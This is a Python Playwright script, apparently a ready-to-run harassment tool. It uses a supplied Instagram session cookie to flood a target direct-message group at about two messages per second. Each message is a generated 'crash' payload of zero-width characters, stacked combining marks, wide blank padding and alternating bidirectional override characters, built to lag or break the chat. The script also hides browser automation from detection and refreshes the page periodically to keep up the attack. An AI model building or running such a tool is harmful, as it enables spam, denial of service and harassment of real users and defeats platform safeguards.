# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (SHADOW-BYPASS REFRESH)
# 📅 STATUS: MEMORY-CLEAN | 2-MPS | DOCKER-READY

import os, asyncio, random, sys
from playwright.async_api import async_playwright

# --- CONFIGURATION ---
STRIKE_LIMIT = 20  # Refresh page every 20 messages to keep speed maxed
# ---------------------

def get_kernel_stop_payload():
    u_id = random.randint(1000, 9999)
    salt = "".join(random.choices(["\u200b", "\u200c", "\u200d"], k=5))
    header = f"👑 ＰＲＡＶＥＥＲ　ＰＡＰＡ 👑 ⚠️ SYSTEM ERROR: TEAM DEVEL HAS BEEN OWNED ⚠️ 🆔 {u_id}{salt} "
    
    z_tower = "̸" * 150 
    width_bomb = "\u2800\u3000" * 15 
    
    body = ""
    for i in range(100):
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        body += f"{width_bomb}{prefix}👑_ＰＡＰＡ_ＯＷＮＳ_{z_tower} "
        
    return (header + body)[:9950]

async def agent_blitz(target_id, cookie):
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True, 
            args=["--disable-blink-features=AutomationControlled", "--no-sandbox", "--disable-setuid-sandbox"]
        )
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        )
        
        await context.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        await context.add_cookies([{"name": "sessionid", "value": cookie, "domain": ".instagram.com", "path": "/", "secure": True}])
        
        page = await context.new_page()
        strike_count = 0

        async def sync_chat():
            print(f"📡 [SYNC] Refreshing Shadow-Bypass Socket...")
            await page.goto(f"https://www.instagram.com/direct/t/{target_id}/", wait_until="domcontentloaded")
            box = page.get_by_role("textbox", name="Message")
            await box.wait_for(state="visible", timeout=60000)
            return box

        try:
            box = await sync_chat()

            while True:
                # 🚀 2-MPS Burst Strategy
                for _ in range(2):
                    payload = get_kernel_stop_payload()
                    await box.fill(payload)
                    await page.keyboard.press("Enter")
                    strike_count += 1
                    print(f"💀 [STRIKE {strike_count}] 1-LINE DELIVERED", flush=True)
                    await asyncio.sleep(0.05) 
                
                await asyncio.sleep(0.8)

                # 🛠️ SHADOW-BYPASS REFRESH LOGIC
                if strike_count >= STRIKE_LIMIT:
                    print(f"🧊 [LIMIT REACHED] Clearing Browser Memory...")
                    strike_count = 0
                    box = await sync_chat() # Hard refresh and re-locate box
                    await asyncio.sleep(2) # Brief rest for the ID

        except Exception as e:
            print(f"❌ Error: {str(e)[:100]}")
            await browser.close()

if __name__ == "__main__":
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    asyncio.run(agent_blitz(target_id, cookie))
